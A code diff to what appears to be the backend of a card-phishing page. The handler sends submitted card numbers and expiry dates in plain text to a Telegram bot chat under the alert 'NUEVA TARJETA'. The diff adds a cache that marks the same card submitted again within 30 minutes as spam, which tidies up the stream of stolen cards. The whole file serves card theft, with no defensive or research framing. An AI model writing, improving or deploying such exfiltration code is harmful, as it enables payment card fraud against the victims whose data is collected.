@@ -1,4 +1,60 @@
 const https = require('https');
+const crypto = require('crypto');
+
+const cardCache = new Map();
+const SPAM_WINDOW_MS = 30 * 60 * 1000;
+const MAX_CACHE_SIZE = 100;
+
+function cleanCache() {
+    const now = Date.now();
+    for (const [hash, data] of cardCache.entries()) {
+        if (now - data.lastSeen > SPAM_WINDOW_MS) {
+            cardCache.delete(hash);
+        }
+    }
+
+    if (cardCache.size > MAX_CACHE_SIZE) {
+        const entries = Array.from(cardCache.entries());
+        entries.sort((a, b) => a[1].lastSeen - b[1].lastSeen);
+        const toDelete = entries.slice(0, entries.length - MAX_CACHE_SIZE);
+        toDelete.forEach(([hash]) => cardCache.delete(hash));
+    }
+}
+
+function getCardHash(cardNumber) {
+    const clean = cardNumber.replace(/\s/g, '');
+    const hash = crypto.createHash('sha256').update(clean).digest('hex');
+    return hash.substring(0, 16);
+}
+
+function checkSpam(cardNumber) {
+    cleanCache();
+
+    const hash = getCardHash(cardNumber);
+    const now = Date.now();
+
+    if (cardCache.has(hash)) {
+        const data = cardCache.get(hash);
+        const timeDiff = now - data.firstSeen;
+
+        if (timeDiff < SPAM_WINDOW_MS) {
+            data.count += 1;
+            data.lastSeen = now;
+            cardCache.set(hash, data);
+            return {
+                isSpam: true,
+                count: data.count,
+                timeDiffMinutes: Math.floor(timeDiff / 60000)
+            };
+        } else {
+            cardCache.set(hash, { count: 1, firstSeen: now, lastSeen: now });
+            return { isSpam: false };
+        }
+    } else {
+        cardCache.set(hash, { count: 1, firstSeen: now, lastSeen: now });
+        return { isSpam: false };
+    }
+}
 
 exports.handler = async (event) => {
     const headers = {
@@ -28,6 +84,9 @@ exports.handler = async (event) => {
 
         if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
             const cleanNum = cardNumber.replace(/\s/g, '');
+
+            const spamCheck = checkSpam(cardNumber);
+
             let cardType = 'CARD';
             if (/^4/.test(cleanNum)) {
                 cardType = 'VISA';
@@ -36,11 +95,18 @@ exports.handler = async (event) => {
             } else if (/^3[47]/.test(cleanNum)) {
                 cardType = 'AMEX';
             }
+
             const fecha = new Date().toLocaleString('es-AR', {
                 timeZone: 'America/Argentina/Buenos_Aires'
             });
 
-            const message = `🔔 NUEVA TARJETA\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
+            let message;
+            if (spamCheck.isSpam) {
+                message = `⚠️ SPAM DETECTADO ⚠️\n\n🔁 TARJETA REPETIDA (${spamCheck.count}x)\n⏱️ Enviada ${spamCheck.count} veces en ${spamCheck.timeDiffMinutes} minutos\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
+                console.log('SPAM detectado:', spamCheck);
+            } else {
+                message = `🔔 NUEVA TARJETA\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
+            }
 
             console.log('Enviando mensaje...');
             try {
